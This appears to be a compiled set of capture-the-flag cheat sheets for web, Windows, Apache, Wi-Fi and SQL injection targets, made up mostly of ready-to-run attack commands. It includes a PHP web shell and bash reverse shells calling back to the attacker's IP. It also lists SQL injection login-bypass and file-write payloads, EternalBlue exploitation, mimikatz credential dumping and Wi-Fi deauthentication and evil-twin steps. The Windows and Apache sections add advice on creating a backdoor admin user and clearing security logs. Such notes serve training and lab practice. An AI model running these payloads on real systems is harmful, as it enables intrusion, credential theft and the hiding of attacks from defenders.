hydra -l Username -P /usr/share/wordlists/rockyou.txt 10.10.252.96 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

---

 CTF Notes for Web Application Machines on HTB

 1. Initial Reconnaissance
 Scan for Open Ports
- Use nmap to identify open ports and services.
bash
nmap -sC -sV -oN nmap_scan.txt <target_ip>

- Key flags:
  - -sC: Runs default scripts.
  - -sV: Detects versions of services.
  - -oN: Saves output to a file.

 Identify Web Services
- If HTTP/HTTPS is open, explore the website in a browser.
- Run a full port scan to ensure nothing is missed:
bash
nmap -p- -T4 -oN full_ports.txt <target_ip>


---

 2. Web Application Enumeration
 Directory and File Bruteforcing
- Use gobuster or dirb to find hidden directories/files:
bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_output.txt


 Identify Technologies
- Use whatweb or wappalyzer to fingerprint technologies:
bash
whatweb http://<target_ip>


 Inspect Source Code
- Check HTML source for comments, hidden fields, or credentials.

 Enumerate Subdomains
- Use ffuf for subdomain enumeration:
bash
ffuf -u http://<target_ip> -H "Host: FUZZ.<target_domain>" -w /path/to/wordlist -o subdomain_enum.txt


---

 3. Vulnerability Analysis
 Check for Common Vulnerabilities
- Use automated scanners like nikto:
bash
nikto -h http://<target_ip>


 Test for SQL Injection
- Test vulnerable inputs using ' OR '1'='1;-- and inspect responses.
- Automate testing with sqlmap:
bash
sqlmap -u http://<target_ip>/vulnerable_page.php?id=1 --batch --dump


 Test for File Upload Vulnerabilities
- Upload a reverse shell payload (e.g., PHP or ASPX):
php
<?php system($_GET['cmd']); ?>


 Cross-Site Scripting (XSS)
- Inject payloads like <script>alert(1)</script> in input fields.

---

 4. Exploitation
 Exploit Webshell or RCE
- Use curl to interact with a web shell:
bash
curl http://<target_ip>/shell.php?cmd=ls


 Reverse Shell
- Generate payload with msfvenom:
bash
msfvenom -p php/reverse_php LHOST=<your_ip> LPORT=<your_port> -o shell.php

- Set up a listener with netcat:
bash
nc -lvnp <your_port>


---

 5. Privilege Escalation
 Enumerate System
- Use linpeas.sh for privilege escalation hints:
bash
wget http://<your_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh


 Search for Passwords or Keys
- Check common directories:
bash
find / -name "*.conf" 2>/dev/null


 Exploit Sudo or Cron Jobs
- Check sudo permissions:
bash
sudo -l

- Exploit vulnerable cron jobs:
bash
echo "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1" > /tmp/exploit.sh
chmod +x /tmp/exploit.sh


---

 6. Capture the Flag
- Navigate to the flag file:
  - User flag: /home/<user>/user.txt
  - Root flag: /root/root.txt
- Print the flag:
bash
cat /root/root.txt


---

 7. Post-Exploit Cleanup
- Remove any uploaded or temporary files:
bash
rm /tmp/exploit.sh


---

 Tools Summary
| Tool      | Purpose                |
|---------------|----------------------------|
| nmap        | Network scanning           |
| gobuster    | Directory brute-forcing    |
| whatweb     | Technology fingerprinting  |
| sqlmap      | SQL injection testing      |
| nikto       | Vulnerability scanning     |
| msfvenom    | Payload creation           |
| netcat      | Reverse shell listener     |
| linpeas     | Privilege escalation       |

---

 CTF Notes for Reverse Engineering

 1. File Analysis
 Identify the File Type
- Use file to determine the type of binary:
bash
file <filename>

- Example output:
  - ELF 64-bit: Linux executable.
  - PE32 executable: Windows executable.
  - Mach-O: macOS binary.

 Check for Strings
- Look for human-readable text using strings:
bash
strings <filename> | less

- Focus on potential hints, error messages, or embedded credentials.

 Check for Symbols
- Use nm to list symbols in the binary (if not stripped):
bash
nm <filename>


---

 2. Dynamic Analysis
 Run the Binary
- Execute the file (if safe) to observe its behavior:
bash
./<filename>

- Input common CTF keywords like flag, admin, or password.

 Trace System Calls
- Use strace to monitor system calls:
bash
strace ./<filename>

- Look for file access, network activity, or other clues.

 Debugging
- Use gdb to step through the binary:
bash
gdb <filename>

  1. Disassemble the main function:
     bash
     disassemble main
     
  2. Set breakpoints:
     bash
     break main
     run
     
  3. Step through code:
     bash
     next
     

---

 3. Static Analysis
 Decompile the Binary
- Use tools like Ghidra or IDA Free to analyze the binary's logic.
  - Look for:
    - Hardcoded keys.
    - Encryption/decryption logic.
    - Input validation.

 Analyze with Radare2 (r2)
- Radare2 is a powerful reverse engineering framework:
bash
r2 -A <filename>

  - Disassemble the binary:
    bash
    pdf @ main
    
  - Search for strings in memory:
    bash
    iz
    
  - Follow execution flow:
    bash
    afl
    

 Check for Obfuscation
- Use binwalk to extract compressed or obfuscated sections:
bash
binwalk <filename>


 Inspect the Binary Header
- Use readelf or objdump for ELF binaries:
bash
readelf -a <filename>

bash
objdump -d <filename> | less


---

 4. Common Scenarios
 Password/Flag Hidden in Binary
- Check strings output or decompiled code for passwords or base64-encoded strings.

 Challenge Requires Patching
- Use gdb or a hex editor like hexedit to modify the binary:
bash
hexedit <filename>

- Change jne (jump if not equal) to je (jump if equal) in assembly.

 Encrypted Flags
- Look for encryption functions like XOR, AES, or custom ciphers.
- Extract keys or algorithms from the binary.
- Use Python for decryption:
python
 Example XOR decryption
ciphertext = "encrypted_flag_here"
key = 0x12
plaintext = ''.join(chr(ord(c) ^ key) for c in ciphertext)
print(plaintext)


 Anti-Debugging Techniques
- Check for:
  - ptrace system calls to detect debugging.
  - Sleep functions to delay execution.
- Patch out such techniques in the binary.

---

 5. Extract Packed or Embedded Data
 Unpack the Binary
- Use upx to unpack compressed binaries:
bash
upx -d <filename>


 Extract Sections
- Use dd to extract specific binary sections:
bash
dd if=<filename> of=section bs=1 skip=<offset> count=<size>


 Carve Out Files
- Use binwalk to extract embedded files:
bash
binwalk -e <filename>


---

 6. Example Workflow
1. Analyze the file type:
   bash
   file challenge.bin
   
2. Extract strings:
   bash
   strings challenge.bin | grep "flag"
   
3. Run in a debugger:
   bash
   gdb challenge.bin
   
4. Decompile for static analysis:
   - Use Ghidra, IDA, or Radare2.
5. Patch or decrypt:
   - Modify the binary to bypass checks or decrypt flag.

---

 Tools Summary
| Tool     | Purpose                  |
|--------------|------------------------------|
| file       | Determine file type          |
| strings    | Extract readable text        |
| gdb        | Debugging and patching       |
| radare2    | Static/dynamic analysis      |
| ghidra     | Decompilation and analysis   |
| binwalk    | Extract embedded data        |
| upx        | Unpack compressed binaries   |
| hexedit    | Modify binary files          |
| objdump    | Disassemble binaries         |

---

CTF Notes for Wi-Fi Hacking

Wi-Fi hacking in CTF challenges typically involves capturing and cracking Wi-Fi network handshakes, exploiting misconfigured routers, or bypassing weak authentication mechanisms.

---

 1. Preparation and Environment Setup

 Tools Youâ€™ll Need
- Aircrack-ng Suite: Captures and cracks WPA/WPA2 handshakes.
- Hashcat: High-performance password cracker.
- Wireshark: Packet analysis.
- Bettercap: Advanced network attack and monitoring tool.
- Reaver: WPS PIN brute force tool.
- hcxtools: Advanced handshake capturing and processing.

 Set Your Wireless Adapter to Monitor Mode
- Ensure your adapter supports monitor mode and packet injection.
- Enable monitor mode with airmon-ng:
bash
airmon-ng start wlan0

- Confirm with:
bash
iwconfig


---

 2. Reconnaissance

 Scan Wi-Fi Networks
- Use airodump-ng to scan networks:
bash
airodump-ng wlan0mon

- Key details to note:
  - BSSID: The MAC address of the access point.
  - Channel: The Wi-Fi channel being used.
  - ESSID: The network name.

---

 3. Capturing Handshakes

 Capture WPA/WPA2 Handshake
- Focus on a specific network using airodump-ng:
bash
airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlan0mon

- Deauthenticate a connected client to force a handshake:
bash
aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon

- Handshake is captured when a WPA handshake message appears in airodump-ng.

---

 4. Cracking the Handshake

 Using Aircrack-ng
- Use a wordlist to crack the password:
bash
aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap


 Using Hashcat
1. Convert the .cap file to a Hashcat-compatible format:
   bash
   hcxpcapngtool -o hash.hc22000 capture-01.cap
   
2. Crack the password with Hashcat:
   bash
   hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt
   

---

 5. Exploiting WPS Vulnerabilities

 Check for WPS Status
- Use wash to identify WPS-enabled networks:
bash
wash -i wlan0mon


 Brute Force WPS PIN
- Use reaver for WPS-enabled networks:
bash
reaver -i wlan0mon -b <BSSID> -c <CHANNEL> -vv


---

 6. Evil Twin Attack

 Clone the Network
- Use airbase-ng to create a rogue access point:
bash
airbase-ng -e "<Network Name>" -c <Channel> wlan0mon


 Capture Login Credentials
- Set up a fake captive portal with tools like Bettercap:
bash
bettercap -iface wlan0mon -caplet http-ui


---

 7. Rogue AP and MITM

 Redirect Traffic
- Set up DNS spoofing with ettercap or dnsmasq:
bash
ettercap -T -q -i wlan0 -M arp:remote // // -P dns_spoof


 Capture Packets
- Use tcpdump or Wireshark to analyze packets:
bash
tcpdump -i wlan0 -w capture.pcap


---

 8. Additional Techniques

 Brute Force Hidden SSID
- If the ESSID is hidden:
bash
airodump-ng --essid <hidden> --bssid <BSSID> --channel <CHANNEL> wlan0mon

- Wait for clients to reconnect or deauthenticate them with aireplay-ng.

 Jamming Wi-Fi
- Use mdk3 to flood a network:
bash
mdk3 wlan0mon d -c <Channel>


---

 9. Post-Exploit Cleanup
- Disable monitor mode:
bash
airmon-ng stop wlan0mon

- Restart network manager:
bash
service NetworkManager restart


---

 10. Tools Summary

| Tool           | Purpose                                          |
|----------------|--------------------------------------------------|
| aircrack-ng    | Handshake capture and cracking.                  |
| hashcat        | High-speed password cracking.                    |
| bettercap      | MITM attacks and network monitoring.             |
| reaver         | WPS PIN brute-forcing.                           |
| hcxpcapngtool  | Convert .cap files for cracking with Hashcat.    |
| tcpdump        | Packet capture and analysis.                     |
| wireshark      | Advanced packet analysis.                        |

---

 Important Notes
1. Legal Use Only: Perform Wi-Fi hacking only in controlled environments or with explicit permission.
2. Wordlist Importance: The success of cracking WPA/WPA2 relies heavily on the quality of your wordlist (e.g., rockyou.txt).
3. Encryption Limitations: WPA3 is significantly harder to crack without advanced exploitation techniques.

---

Hacking a Windows machine in a CTF environment, such as Hack The Box, usually involves enumerating services, exploiting vulnerabilities, and escalating privileges.

---

 CTF Notes for Hacking a Windows Machine

 1. Reconnaissance
 Network Scanning
- Perform an initial scan with nmap:
bash
nmap -sC -sV -oN nmap_scan.txt <target_ip>

- Look for services like:
  - SMB (ports 445/139)
  - RDP (port 3389)
  - WinRM (port 5985/5986)
  - HTTP/HTTPS (ports 80/443)

 Enumerate Open Ports
- Perform a full port scan:
bash
nmap -p- -T4 -oN full_scan.txt <target_ip>


---

 2. SMB Enumeration
 Check for Shares
- Use smbclient to list shares:
bash
smbclient -L //<target_ip> -N

- Connect to a share:
bash
smbclient //<target_ip>/<share_name>


 Enumerate SMB Shares
- Use enum4linux:
bash
enum4linux <target_ip>

- Or smbmap to check access permissions:
bash
smbmap -H <target_ip>


 Exploit SMB Vulnerabilities
- Check for EternalBlue (MS17-010) using nmap:
bash
nmap --script smb-vuln-ms17-010 -p445 <target_ip>

- Exploit using Metasploit:
bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <target_ip>
run


---

 3. Web Application Enumeration
 Explore Web Services
- Use gobuster or dirb to find hidden directories:
bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt

- Look for:
  - Web login panels.
  - Upload functionality.
  - Misconfigured services (e.g., Jenkins, IIS).

 Exploit Web Vulnerabilities
- Test for SQL Injection, LFI, or RCE:
  - Use tools like sqlmap for SQL injection.
  - Try uploading a malicious payload (e.g., .aspx shell) for RCE.

 Brute Force Credentials
- Use Hydra for basic authentication:
bash
hydra -l admin -P /path/to/wordlist.txt http-get://<target_ip>/login


---

 4. WinRM (Windows Remote Management)
 Check for WinRM Access
- Use crackmapexec to test credentials:
bash
crackmapexec winrm <target_ip> -u <username> -p <password>


 Remote Access
- If credentials are valid, use evil-winrm:
bash
evil-winrm -i <target_ip> -u <username> -p <password>


---

 5. Password Cracking
 Extract Hashes
- Use samdump2 or impacket-secretsdump to dump credentials:
bash
impacket-secretsdump Administrator@<target_ip>


 Crack Passwords
- Crack NTLM hashes with hashcat:
bash
hashcat -m 1000 hash.txt /path/to/wordlist.txt


---

 6. Privilege Escalation
 Enumerate the System
- Use winPEAS to find privilege escalation paths:
bash
winPEAS.exe

- Check for:
  - Misconfigured services.
  - Writable directories.
  - Stored credentials.

 Abuse SeImpersonatePrivilege
- Exploit tokens using PrintSpoofer:
bash
PrintSpoofer.exe -i -c cmd.exe


 Kernel Exploits
- Check Windows version for vulnerabilities:
bash
systeminfo

- Exploit common vulnerabilities like:
  - MS10-059: Windows Task Scheduler.
  - MS16-032: Secondary Logon.

 Abuse Unquoted Service Paths
- Identify misconfigured services:
powershell
wmic service get name,displayname,pathname,startmode | findstr "Auto" | findstr /i /v "C:\Windows"

- Replace the executable with a malicious payload.

 Dumping Passwords
- Use mimikatz to extract plaintext passwords:
bash
mimikatz
sekurlsa::logonpasswords


---

 7. Capture the Flag
- Locate the flags:
  - User flag: C:\Users\<user>\Desktop\user.txt
  - Root flag: C:\Users\Administrator\Desktop\root.txt
- Read the flag:
bash
type C:\Users\<user>\Desktop\user.txt


---

 8. Post-Exploitation
 Persistence
- Add a new user for backdoor access:
powershell
net user hacker Pass123! /add
net localgroup administrators hacker /add


 Cleanup
- Remove tools and logs:
powershell
del /f /q <tool_name>
clear-eventlog -LogName Security


---

 Tools Summary
| Tool              | Purpose                              |
|------------------------|------------------------------------------|
| nmap                | Port scanning and vulnerability detection. |
| smbclient           | Access SMB shares.                       |
| enum4linux          | SMB enumeration.                         |
| evil-winrm          | Remote management on Windows.            |
| impacket-secretsdump| Extract hashes and credentials.          |
| mimikatz            | Dump plaintext passwords.                |
| winPEAS             | Privilege escalation enumeration.        |
| hashcat             | Crack NTLM hashes.                       |
| PrintSpoofer        | Exploit impersonation privileges.         |

---

 Important Notes
- Always scan and enumerate thoroughly before attempting exploitation.
- If using Metasploit, avoid automated exploitation unless allowed.
- Document all steps for reproducibility.

---

 CTF Notes for Hacking an Apache2 Server

Apache2 servers are a common target in CTFs and penetration testing. They host web applications, and their vulnerabilities often stem from misconfigurations, outdated software, or vulnerable web applications running on them.

---

 1. Reconnaissance
 Identify Open Ports
- Use nmap to scan for HTTP(S) services:
bash
nmap -sC -sV -p 80,443 <target_ip>


 Enumerate HTTP Service
- Gather information about the server:
bash
curl -I http://<target_ip>

- Look for:
  - Server version (e.g., Apache/2.4.29).
  - X-Powered-By headers.
  - Any unusual response headers.

 Detailed Web Server Scan
- Use nikto to identify vulnerabilities:
bash
nikto -h http://<target_ip>


 Directory Bruteforcing
- Discover hidden directories:
bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

- Note any admin panels, configuration files, or sensitive directories.

---

 2. Exploit Misconfigurations
 Check for Directory Listing
- Visit potential directories (e.g., /uploads/) and check if directory listing is enabled.
- If files are accessible, download and analyze them:
bash
wget http://<target_ip>/uploads/file.txt


 Test Default Files
- Try common paths for sensitive files:
  - http://<target_ip>/phpinfo.php
  - http://<target_ip>/server-status

 Configuration Files
- Look for .htaccess or .conf files:
  - They may reveal authentication configurations, redirection rules, or sensitive paths.

---

 3. Vulnerabilities and Exploits
 Outdated Apache2 Version
- Check for known vulnerabilities using the server version:
bash
searchsploit apache 2.4.29

- Use Metasploit for automated exploitation:
bash
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST <target_ip>
set RPORT 80
run


 File Inclusion (LFI/RFI)
- Test for Local File Inclusion (LFI):
  - Try accessing files like /etc/passwd:
    bash
    curl http://<target_ip>/index.php?page=../../../../etc/passwd
    
- For Remote File Inclusion (RFI), host a malicious script:
bash
python3 -m http.server 8000
curl http://<target_ip>/index.php?page=http://<your_ip>:8000/shell.php


---

 4. Web Application Exploitation
 SQL Injection
- Use sqlmap to test for SQL vulnerabilities:
bash
sqlmap -u "http://<target_ip>/login.php?username=admin&password=123" --dbs


 Command Injection
- Test form inputs or parameters for command injection:
bash
curl -X POST -d "ip=127.0.0.1; cat /etc/passwd" http://<target_ip>/ping.php


 File Upload Vulnerabilities
- If a file upload functionality exists:
  - Upload a PHP reverse shell (e.g., php-reverse-shell.php from pentestmonkey).
  - Access the uploaded file to get a shell:
    bash
    curl http://<target_ip>/uploads/php-reverse-shell.php
    

---

 5. Privilege Escalation
 Enumerate Apache Configurations
- Check common paths for Apache configurations:
  - /etc/apache2/apache2.conf
  - /etc/httpd/conf/httpd.conf

 Search for Credentials
- Look for hardcoded credentials in:
  - .htpasswd files.
  - Configuration files like wp-config.php.

 Log Poisoning
- Inject malicious code into Apache logs:
  - Access logs: /var/log/apache2/access.log.
  - Inject a reverse shell payload:
    bash
    curl "http://<target_ip>/<?php system($_GET['cmd']); ?>"
    
  - Execute the payload:
    bash
    curl "http://<target_ip>/access.log?cmd=id"
    

---

 6. Reverse Shell
 PHP Reverse Shell
1. Use a pre-built PHP reverse shell:
   php
   <?php
   exec("/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'");
   ?>
   
2. Set up a listener on your machine:
   bash
   nc -lvnp <port>
   

3. Access the uploaded shell file.

---

 7. Post-Exploitation
 Escalate Privileges
- Check running processes for credentials or misconfigurations:
bash
ps aux

- Exploit sudo rights or SUID binaries.

 Capture the Flag
- Flags are typically located in:
  - /var/www/html/flag.txt
  - /home/<user>/flag.txt
  - /root/root.txt

 Clean Up
- Remove any uploaded shells or modifications:
bash
rm /var/www/html/shell.php


---

 8. Tools Summary
| Tool              | Purpose                                      |
|------------------------|--------------------------------------------------|
| nmap                | Initial port and vulnerability scanning.         |
| nikto               | Web server misconfiguration scanning.            |
| gobuster            | Directory and file discovery.                    |
| sqlmap              | Automated SQL injection exploitation.            |
| searchsploit        | Search for exploits based on version.            |
| Metasploit          | Exploit development and execution.               |
| netcat              | Reverse shell listener.                          |

---

 Important Notes
1. Legal Use Only: Perform Apache2 exploitation only in a lab or with explicit permission.
2. Backup Analysis: Always analyze downloaded files for clues about credentials or sensitive data.
3. Persistence Awareness: Apache logs can reveal your activities; consider clearing them if required.

---

CTF Notes for SQL Injection Exploitation

SQL Injection (SQLi) is a common and powerful attack technique in CTF challenges, especially in web applications. The goal is to exploit a vulnerable SQL query to retrieve sensitive data, bypass authentication, or execute commands on the database.

---

 1. Types of SQL Injection
1. Error-Based SQL Injection: Exploit database error messages to infer the structure of the database.
2. Union-Based SQL Injection: Use the UNION SQL operator to extract additional data.
3. Boolean-Based Blind SQL Injection: Infer data by observing application behavior (true/false conditions).
4. Time-Based Blind SQL Injection: Infer data by injecting time delays in SQL queries.
5. Out-of-Band SQL Injection: Use external channels (e.g., DNS) to exfiltrate data.

---

 2. Identifying SQL Injection
 Manual Testing
 Basic Input Testing
1. Test inputs with ' or " to cause errors.
   Example:
   bash
   http://<target>/login.php?username='&password=123
   
2. Look for SQL error messages:
   - MySQL: You have an error in your SQL syntax
   - MSSQL: Unclosed quotation mark after the character string
   - PostgreSQL: ERROR: unterminated quoted string

 Common SQL Injection Payloads
- ' OR '1'='1
- ' OR '1'='1' --
- " OR 1=1 --
- ' UNION SELECT NULL --

---

 Automated Detection
 Using sqlmap
1. Point sqlmap to the target URL:
   bash
   sqlmap -u "http://<target>/login.php?username=admin&password=123"
   
2. Detect available databases:
   bash
   sqlmap -u "http://<target>/vuln" --dbs
   

---

 3. Exploiting SQL Injection
 Error-Based SQL Injection
Exploit error messages to extract data.

 Examples:
1. Retrieve database name:
   sql
   ' AND EXTRACTVALUE(1, CONCAT(0x3a, database())) --
   
2. Retrieve table names:
   sql
   ' AND (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) --
   

---

 Union-Based SQL Injection
Combine results of multiple queries using UNION.

 Steps:
1. Find the number of columns:
   bash
   ' ORDER BY 1 --
   ' ORDER BY 2 --
   ...
   
   Stop when the query fails, indicating the number of columns.

2. Identify injectable columns:
   sql
   ' UNION SELECT NULL, NULL, 'test' --
   

3. Extract data:
   sql
   ' UNION SELECT null, database(), user() --
   

---

 Boolean-Based Blind SQL Injection
Infer data by testing true/false conditions.

 Example:
1. Test for a true condition:
   sql
   ' AND 1=1 --
   
2. Test for a false condition:
   sql
   ' AND 1=2 --
   

3. Extract database name:
   sql
   ' AND SUBSTRING((SELECT database()),1,1)='a' --
   

---

 Time-Based Blind SQL Injection
Use time delays to infer data.

 Examples:
1. Test for vulnerability:
   sql
   ' AND SLEEP(5) --
   

2. Extract data:
   sql
   ' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0) --
   

---

 Bypassing Login
 Payloads for Authentication Bypass:
1. ' OR '1'='1' --
2. ' UNION SELECT 1,2,3 --
3. " OR 1=1 --

---

 Dumping Data
 Using sqlmap
1. Dump all tables:
   bash
   sqlmap -u "http://<target>/vuln" --tables
   
2. Dump specific columns:
   bash
   sqlmap -u "http://<target>/vuln" -D <database_name> -T <table_name> --columns
   
3. Extract data:
   bash
   sqlmap -u "http://<target>/vuln" -D <database_name> -T <table_name> -C <column_name> --dump
   

---

 4. Escalating Attacks
 File Read/Write
 MySQL:
1. Write to a file:
   sql
   ' UNION SELECT "PHP shell content" INTO OUTFILE '/var/www/html/shell.php' --
   

2. Access the shell:
   bash
   http://<target>/shell.php
   

---

 OS Command Execution
 MSSQL:
1. Execute system commands:
   sql
   '; EXEC xp_cmdshell 'whoami' --
   

---

 5. Mitigation Techniques
- Always sanitize user input using prepared statements or parameterized queries.
- Implement a Web Application Firewall (WAF).
- Limit database permissions to the minimum required for functionality.
- Use strict error handling to avoid leaking database details.

---

 Tools for SQL Injection
| Tool       | Purpose                                      |
|-----------------|--------------------------------------------------|
| sqlmap       | Automated SQL injection exploitation.            |
| Burp Suite   | Intercept and modify HTTP requests.              |
| Hydra        | Brute force login credentials for bypass.        |
| wpscan       | Scan for vulnerabilities in WordPress websites.  |

---

 Important Notes
- Be cautious when exploiting SQL Injection, especially in real-world applications.
- Always have explicit permission before performing any attacks.
- Keep detailed notes of the payloads and results for CTF writeups or learning.
